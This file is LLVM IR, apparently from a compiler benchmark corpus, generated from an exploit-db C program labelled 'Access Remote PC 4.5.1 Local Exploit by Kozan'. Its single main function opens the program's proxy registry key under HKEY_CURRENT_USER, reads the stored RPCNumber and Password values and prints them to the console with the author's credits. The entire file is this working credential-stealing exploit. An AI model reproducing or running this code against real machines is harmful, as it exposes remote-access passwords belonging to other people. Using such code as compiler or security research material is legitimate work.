; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1086.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1086.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF = common dso_local global i32 0, align 4
@HKEY_CURRENT_USER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [47 x i8] c"Software\\Access Remote PC\\Client\\Options\\Proxy\00", align 1
@KEY_QUERY_VALUE = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [46 x i8] c"Access Remote PC is not installed on you PC!\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"RPCNumber\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"Not Found!\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"Password\00", align 1
@.str.5 = private unnamed_addr constant [47 x i8] c"Access Remote PC 4.5.1 Local Exploit by Kozan\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"Credits to AtmaCA\0A\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"www.netmagister.com - www.spyinstructors.com \0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"kozan@netmagister.com\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"RPCNumber\09: %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"Password\09: %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %8 = load i32, i32* @BUF, align 4
  %9 = zext i32 %8 to i64
  %10 = call i8* @llvm.stacksave()
  store i8* %10, i8** %3, align 8
  %11 = alloca i8, i64 %9, align 16
  store i64 %9, i64* %4, align 8
  %12 = load i32, i32* @BUF, align 4
  %13 = zext i32 %12 to i64
  %14 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %5, align 8
  %15 = load i32, i32* @BUF, align 4
  store i32 %15, i32* %6, align 4
  %16 = load i32, i32* @HKEY_CURRENT_USER, align 4
  %17 = load i32, i32* @KEY_QUERY_VALUE, align 4
  %18 = call i64 @RegOpenKeyEx(i32 %16, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0), i32 0, i32 %17, i32* %2)
  %19 = load i64, i64* @ERROR_SUCCESS, align 8
  %20 = icmp ne i64 %18, %19
  br i1 %20, label %21, label %24

21:                                               ; preds = %0
  %22 = load i32, i32* @stdout, align 4
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %7, align 4
  br label %53

24:                                               ; preds = %0
  %25 = load i32, i32* %2, align 4
  %26 = bitcast i8* %11 to i32*
  %27 = call i64 @RegQueryValueEx(i32 %25, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32* null, i32* null, i32* %26, i32* %6)
  %28 = load i64, i64* @ERROR_SUCCESS, align 8
  %29 = icmp ne i64 %27, %28
  br i1 %29, label %30, label %32

30:                                               ; preds = %24
  %31 = call i32 @lstrcpy(i8* %11, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  br label %32

32:                                               ; preds = %30, %24
  %33 = load i32, i32* %2, align 4
  %34 = bitcast i8* %14 to i32*
  %35 = call i64 @RegQueryValueEx(i32 %33, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32* null, i32* null, i32* %34, i32* %6)
  %36 = load i64, i64* @ERROR_SUCCESS, align 8
  %37 = icmp ne i64 %35, %36
  br i1 %37, label %38, label %40

38:                                               ; preds = %32
  %39 = call i32 @lstrcpy(i8* %14, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %32
  %41 = load i32, i32* @stdout, align 4
  %42 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.5, i64 0, i64 0))
  %43 = load i32, i32* @stdout, align 4
  %44 = call i32 (i32, i8*, ...) @fprintf(i32 %43, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  %45 = load i32, i32* @stdout, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  %47 = load i32, i32* @stdout, align 4
  %48 = call i32 (i32, i8*, ...) @fprintf(i32 %47, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %49 = load i32, i32* @stdout, align 4
  %50 = call i32 (i32, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0), i8* %11)
  %51 = load i32, i32* @stdout, align 4
  %52 = call i32 (i32, i8*, ...) @fprintf(i32 %51, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0), i8* %14)
  store i32 0, i32* %1, align 4
  store i32 1, i32* %7, align 4
  br label %53

53:                                               ; preds = %40, %21
  %54 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %54)
  %55 = load i32, i32* %1, align 4
  ret i32 %55
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i64 @RegQueryValueEx(i32, i8*, i32*, i32*, i32*, i32*) #2

declare dso_local i32 @lstrcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
